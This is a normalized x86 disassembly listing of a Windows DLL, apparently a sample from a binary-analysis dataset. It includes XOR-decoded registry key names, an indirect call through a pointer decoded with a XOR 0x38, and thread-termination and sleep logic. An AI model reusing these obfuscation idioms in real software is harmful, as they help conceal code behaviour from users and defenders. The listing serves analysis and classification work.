sub_10001000
push ebp
mov ebp esp
push 0xffffffff
push sub_10080d80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub ecx 0x1c
cmp eax ecx
je r-xdata
mov ebx [ eax + 0xc ]
mov edx [ eax ]
mov esi [ eax + 0x4 ]
mov edi [ eax + 0x8 ]
mov [ ebp - 0x14 ] ebx
mov ebx [ ecx ]
mov [ eax ] ebx
mov ebx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ebx
mov ebx [ ecx + 0x8 ]
mov [ eax + 0x8 ] ebx
mov ebx [ ecx + 0xc ]
mov [ eax + 0xc ] ebx
mov [ ecx ] edx
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x4 ] esi
mov [ ecx + 0x8 ] edi
mov [ ecx + 0xc ] edx
mov edx [ eax + 0x10 ]
mov esi [ ecx + 0x10 ]
mov [ eax + 0x10 ] esi
mov [ ecx + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov esi [ ecx + 0x14 ]
mov [ eax + 0x14 ] esi
add eax 0x1c
mov [ ecx + 0x14 ] edx
cmp eax ecx
jne r-xdata
sub_100010b0
push ebp
mov ebp esp
mov eax [ edi + 0x110 ]
sub esp 0x8
push ebx
mov ebx [ WaitForSingleObject@IAT ]
push esi
push 0xffffffff
push eax
call ebx
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
je r-xdata
mov edx [ edi + 0x110 ]
push edx
call [ ReleaseMutex@IAT ]
xor eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x104 ]
test ecx ecx
je r-xdata
mov edx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov eax edx
cmp eax esi
je r-xdata
cmp [ ecx + 0xd4 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] edx
cmp edx esi
je r-xdata
test ecx ecx
je r-xdata
mov eax [ edi + 0x110 ]
push eax
call [ ReleaseMutex@IAT ]
mov eax [ edi + 0x104 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + 0x110 ]
mov esi [ ReleaseMutex@IAT ]
push edx
call esi
inc [ edi + 0x10c ]
cmp [ edi + 0x10c ] 0x3
jb r-xdata
lea ebx [ edi + 0x14 ]
add eax 0x4
cmp eax esi
jne r-xdata
cmp ecx [ eax ]
je r-xdata
mov ecx [ edi + 0x110 ]
push 0xffffffff
push ecx
call ebx
mov edx [ edi + 0x110 ]
push edx
mov [ edi + 0x104 ] 0x0
call esi
mov eax [ edi + 0x110 ]
push 0xffffffff
push eax
mov [ edi + 0x108 ] 0x0
call ebx
cmp [ edi + 0x104 ] 0x0
je r-xdata
push 0x0
mov [ edi + 0xc0 ] 0x0
call sub_1004fc50
test eax eax
je r-xdata
push eax
call sub_1004fc50
test eax eax
je r-xdata
jmp r-xdata
mov edx eax
mov eax [ edi + 0x110 ]
push eax
mov [ edi + 0x108 ] 0x1
call esi
lea ecx [ ecx ]
lea ecx [ edi + 0x14 ]
push ecx
mov [ edi + 0x108 ] 0x1
mov [ edi + 0x10c ] 0x0
call [ LeaveCriticalSection@IAT ]
mov edx [ edi + 0x110 ]
push edx
call [ ReleaseMutex@IAT ]
mov eax [ edi + 0x104 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
mov [ edi + 0xc0 ] 0x1
call sub_1004fc50
test eax eax
je r-xdata
mov ecx [ edi + 0x110 ]
push ecx
call esi
push 0x1b7740
call [ Sleep@IAT ]
mov edx [ edi + 0x110 ]
push 0xffffffff
push edx
call ebx
cmp [ edi + 0x104 ] 0x0
jne r-xdata
push 0x2
mov [ edi + 0xc0 ] 0x2
call sub_1004fc50
test eax eax
je r-xdata
mov ecx [ edi + 0x104 ]
mov [ edi + 0xc0 ] 0x3
push ebx
mov [ ecx + 0xd4 ] 0x0
call [ LeaveCriticalSection@IAT ]
mov edx [ edi + 0x110 ]
mov esi [ ReleaseMutex@IAT ]
push edx
call esi
push 0x927c0
call [ Sleep@IAT ]
mov eax [ edi + 0x110 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
cmp [ edi + 0x104 ] 0x0
je r-xdata
mov ecx [ edi + 0x110 ]
push ecx
call esi
mov ebx [ WaitForSingleObject@IAT ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x4 ] eax
cmp eax [ edi + 0x8 ]
jne r-xdata
mov eax [ edi + 0x110 ]
push 0xffffffff
push eax
call ebx
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push ebx
mov [ edi + 0x104 ] eax
call [ EnterCriticalSection@IAT ]
mov eax [ edi + 0xc0 ]
mov esi [ edi + 0x104 ]
cmp eax 0x3
je r-xdata
mov ebx [ WaitForSingleObject@IAT ]
sub_10001330
mov eax [ esi + 0x1c ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
push edi
mov edi [ esi + 0x20 ]
call sub_10020290
mov eax [ esi + 0x1c ]
push eax
call sub_1006591f
add esp 0x4
pop edi
push esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
call sub_1006591f
add esp 0x4
mov eax esi
pop ebx
retn
push eax
call sub_1006591f
add esp 0x4
sub_10001380
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x40 ]
push ebx
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
cmp [ esi + 0x90 ] 0x8
jb r-xdata
cmp [ esi ] 0x1
jne r-xdata
mov edi 0x7
xor ecx ecx
mov [ esi + 0x90 ] edi
mov [ esi + 0x8c ] ebx
mov [ esi + 0x7c ] cx
cmp [ esi + 0x74 ] 0x8
jb r-xdata
mov eax [ esi + 0x7c ]
push eax
call sub_1006591f
add esp 0x4
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor eax eax
mov [ esi + 0x74 ] edi
mov [ esi + 0x70 ] ebx
mov [ esi + 0x60 ] ax
mov eax [ esi + 0x50 ]
cmp eax ebx
je r-xdata
mov edx [ esi + 0x60 ]
push edx
call sub_1006591f
add esp 0x4
mov [ esi + 0x50 ] ebx
mov [ esi + 0x54 ] ebx
mov [ esi + 0x58 ] ebx
cmp [ esi + 0x38 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov edi [ esi + 0x54 ]
push ecx
call sub_10026d80
mov edx [ esi + 0x50 ]
push edx
call sub_1006591f
add esp 0x8
mov edi 0xf
mov [ esi + 0x38 ] edi
mov [ esi + 0x34 ] ebx
mov [ esi + 0x24 ] bl
cmp [ esi + 0x1c ] 0x10
jb r-xdata
mov eax [ esi + 0x24 ]
push eax
call sub_1006591f
add esp 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x18 ] ebx
pop edi
mov [ esi + 0x8 ] bl
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x8 ]
push ecx
call sub_1006591f
add esp 0x4
sub_10001460
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_10043190
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100014b7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] eax
cmp eax 0x4
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_10039bcb
pop ecx
sub_100014df
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_100097fb
call sub_100097fb
mov [ esi ] eax
jmp r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
call sub_1001d849
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_100097fb
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_10001540
push ebp
mov ebp esp
push 0xffffffff
push sub_10080eb1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x24
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
add edi 0x24
jmp r-xdata
push 0xffffffff
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_10019180
mov ecx [ edi + 0x1c ]
mov [ esi + 0x1c ] ecx
mov edx [ edi + 0x20 ]
mov [ esi + 0x20 ] edx
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_100015bc
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_1000bd19
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1005e450
add esi 0x24
cmp esi edi
jne r-xdata
sub_100015f0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
push edi
mov edi 0x1
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x0
push eax
call [ TerminateThread@IAT ]
mov ecx [ esi + 0x4c ]
mov edi eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp - 0x4 ] al
xor [ ebp - 0x3 ] al
xor [ ebp - 0x2 ] al
xor [ ebp - 0x1 ] al
push ecx
call [ ebp - 0x4 ]
mov [ esi + 0x4c ] 0x0
sub_10001670
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10023cd0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_100016a0
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx + 0x15 ] 0x0
push esi
push edi
mov [ ebp - 0x4 ] ecx
je r-xdata
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ebx
call sub_100145d0
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_10050437
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ ecx + 0x4 ]
mov [ ebp - 0xc ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x8 ]
mov bl 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
push edi
call sub_10038f30
mov ecx [ ebp - 0x4 ]
add esp 0x4
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
call sub_1006591f
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
cmp edi [ edx + 0x4 ]
je r-xdata
push edi
call sub_10030410
mov ecx [ ebp - 0xc ]
add esp 0x4
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov esp ebp
pop ebp
retn 0x8
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov eax [ esi ]
cmp edi eax
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ eax + 0x14 ] bl
push esi
mov [ esi + 0x14 ] 0x0
call sub_100503e0
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ eax + 0x14 ] bl
push esi
mov [ esi + 0x14 ] 0x0
call sub_10057ed0
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov edx [ eax ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x14 ] bl
je r-xdata
mov dl [ esi + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ esi + 0x14 ] bl
mov eax [ eax ]
push esi
mov [ eax + 0x14 ] bl
call sub_100503e0
mov edx [ eax + 0x8 ]
mov [ edx + 0x14 ] bl
push eax
mov [ eax + 0x14 ] 0x0
call sub_10057ed0
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov dl [ esi + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ esi + 0x14 ] bl
mov eax [ eax + 0x8 ]
push esi
mov [ eax + 0x14 ] bl
call sub_10057ed0
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x14 ] bl
push eax
mov [ eax + 0x14 ] 0x0
call sub_100503e0
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
sub_100018ed
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000d0ca
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1000198a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1000a4a1
mov [ esi ] ax
add esi 0x2
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_100019c0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
push edi
mov edi [ ebp + 0x8 ]
push eax
push edi
call sub_10035fe0
mov ecx [ esi + 0x10 ]
push ecx
push edi
call sub_10035fe0
push esi
push edi
call sub_10035fe0
add esp 0x18
pop edi
pop esi
pop ebp
retn
sub_100019f0
push ebp
mov ebp esp
push 0xffffffff
push sub_100823fd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x31c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
mov edi ecx
xor ebx ebx
push ebx
mov [ ebp - 0x2fc ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x304 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_1004d9c0
jmp r-xdata
push 0x208
lea eax [ ebp - 0x218 ]
push ebx
push eax
call sub_10079a10
add esp 0xc
lea ecx [ ebp - 0x218 ]
call sub_10048a90
test eax eax
je r-xdata
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x2e0 ]
cmp esi ebx
je r-xdata
or esi 0xffffffff
mov [ ebp - 0x4 ] esi
push eax
lea ecx [ ebp - 0x2e4 ]
mov [ ebp - 0x2e4 ] ebx
mov [ ebp - 0x2e0 ] ebx
call sub_1003b340
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x2e4 ] ebx
jne r-xdata
push 0x1
call sub_10055606
add esp 0x4
push eax
lea ecx [ ebp - 0x2ec ]
mov [ ebp - 0x2ec ] ebx
mov [ ebp - 0x2e8 ] ebx
call sub_100304d0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x2ec ] ebx
jne r-xdata
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x2e0 ]
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea esi [ ebp - 0x2e4 ]
call sub_10018d10
test eax eax
je r-xdata
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] esi
call sub_10044190
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ebx [ ebp - 0x2e4 ]
call sub_1003ae80
test eax eax
je r-xdata
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
mov eax esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
mov eax 0x4
jmp r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
cmp [ edi + 0x14 ] 0x8
jb r-xdata
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov eax edi
mov eax [ edi ]
jmp r-xdata
push eax
call ebx
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x2f0 ] eax
call sub_10029c40
lea ecx [ ebp - 0x26c ]
call sub_10029c40
lea ecx [ ebp - 0x2a4 ]
call sub_10029c40
xor ecx ecx
mov [ ebp - 0x220 ] 0x7
mov [ ebp - 0x224 ] 0x0
mov [ ebp - 0x234 ] cx
mov edi [ ebp - 0x2fc ]
push 0xffffffff
push ecx
lea edx [ edi + 0x3c ]
push edx
lea ecx [ ebp - 0x234 ]
mov [ ebp - 0x4 ] 0x5
call sub_10019180
push 0xffffffff
push 0x0
lea eax [ edi + 0x58 ]
push eax
lea ecx [ ebp - 0x234 ]
call sub_10043930
mov eax [ ebp - 0x234 ]
cmp [ ebp - 0x220 ] esi
jae r-xdata
mov eax [ eax ]
mov ebx [ SysAllocString@IAT ]
push eax
call ebx
movzx edx [ edi + 0x38 ]
push edx
lea esi [ ebp - 0x2a4 ]
mov [ ebp - 0x300 ] eax
call sub_10058280
add esp 0x4
mov esi eax
push r--data
add edi 0x1c
lea eax [ ebp - 0x26c ]
push edi
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1002cd10
add esp 0xc
mov ecx eax
mov eax esi
lea edi [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0x4
call sub_10044a40
mov esi 0x8
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
call ebx
push r--data
mov [ ebp - 0x2f4 ] eax
call ebx
movzx ecx [ edi + 0x74 ]
push ecx
lea esi [ ebp - 0x2c0 ]
mov [ ebp - 0x2f8 ] eax
call sub_10058280
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
lea eax [ ebp - 0x234 ]
push eax
call ebx
lea ecx [ ebp - 0x2c0 ]
mov [ ebp - 0x304 ] eax
call sub_10029c40
mov edx [ edi + 0x78 ]
push edx
lea esi [ ebp - 0x2dc ]
call sub_10058280
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ eax ]
push eax
call ebx
lea ecx [ ebp - 0x2dc ]
mov edi eax
call sub_10029c40
mov eax [ ebp - 0x2fc ]
mov ecx [ eax + 0x7c ]
push ecx
lea esi [ ebp - 0x288 ]
call sub_10058280
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ eax ]
push eax
call ebx
lea ecx [ ebp - 0x288 ]
mov esi eax
call sub_10029c40
mov ebx [ ebp - 0x304 ]
mov edx [ ebp - 0x2f0 ]
mov eax [ ebp - 0x300 ]
mov ecx [ ebp - 0x2f4 ]
push esi
push edi
push ebx
push edx
mov edx [ ebp - 0x2f8 ]
push eax
lea esi [ ebp - 0x328 ]
call sub_10005ef0
mov ecx [ ebp - 0x300 ]
mov [ ebp - 0x4 ] 0x6
mov esi [ SysFreeString@IAT ]
push ecx
call esi
mov edx [ ebp - 0x2f0 ]
push edx
call esi
mov eax [ ebp - 0x2f4 ]
push eax
call esi
mov ecx [ ebp - 0x2f8 ]
push ecx
call esi
push ebx
call esi
push edi
call esi
mov eax [ ebp - 0x2e4 ]
lea edx [ ebp - 0x328 ]
add eax 0x128
push edx
call sub_10058fc0
lea ecx [ ebp - 0x2e4 ]
call sub_1003b980
test eax eax
lea eax [ ebp - 0x328 ]
je r-xdata
mov eax [ eax ]
call sub_10011310
lea ecx [ ebp - 0x234 ]
call sub_10029c40
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
xor eax eax
call sub_10011310
lea ecx [ ebp - 0x234 ]
call sub_10029c40
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
mov eax 0x6
jmp r-xdata
sub_10001ea0
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x7c
and edx 0xff
mov [ ebp + eax * 2 - 0x80 ] dx
inc eax
cmp eax 0x3c
jb r-xdata
lea ecx [ ebp - 0x84 ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0x80 ]
push edx
push 0x80000002
mov [ ebp - 0x8 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x84 ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
call sub_10024145
mov esp ebp
pop ebp
retn
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10001f30
push ebp
mov ebp esp
push 0xffffffff
push sub_1008224b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push ebx
push ebx
push 0x1
push ebx
mov [ ebp - 0x320 ] ebx
call [ CreateEventW@IAT ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x334 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push ebx
mov [ ebp - 0x330 ] eax
lea eax [ ebp - 0x334 ]
push eax
push sub_100470c0
push ebx
push ebx
mov [ ebp - 0x32c ] ecx
mov [ ebp - 0x328 ] edx
mov [ ebp - 0x324 ] ebx
call sub_1002f01f
mov edi [ CloseHandle@IAT ]
add esp 0x18
push eax
call edi
mov ecx [ ebp - 0x334 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov edx [ ebp - 0x334 ]
push edx
call edi
mov ecx [ ebp - 0x324 ]
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0x9a
call sub_10013830
lea edx [ ebp - 0xf4 ]
mov eax 0x46
call sub_10013830
lea edx [ ebp - 0x31c ]
push edx
push 0x1
push ebx
lea eax [ ebp - 0xf4 ]
push eax
push 0x80000001
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x318 ] ax
mov eax ecx
mov [ ebp - 0x304 ] 0x7
mov [ ebp - 0x308 ] ebx
lea edi [ eax + 0x2 ]
lea esp [ esp ]
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x2fc ]
[ edi ]
lea edx [ ebp - 0x28 ]
mov eax 0x26
mov [ ebp - 0x320 ] 0x206
call sub_10013830
lea eax [ ebp - 0x320 ]
push eax
mov eax [ ebp - 0x31c ]
lea ecx [ ebp - 0x2fc ]
push ecx
push ebx
push ebx
push edx
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
xor ecx ecx
lea eax [ ebp - 0x7c ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
lea edx [ eax + 0x2 ]
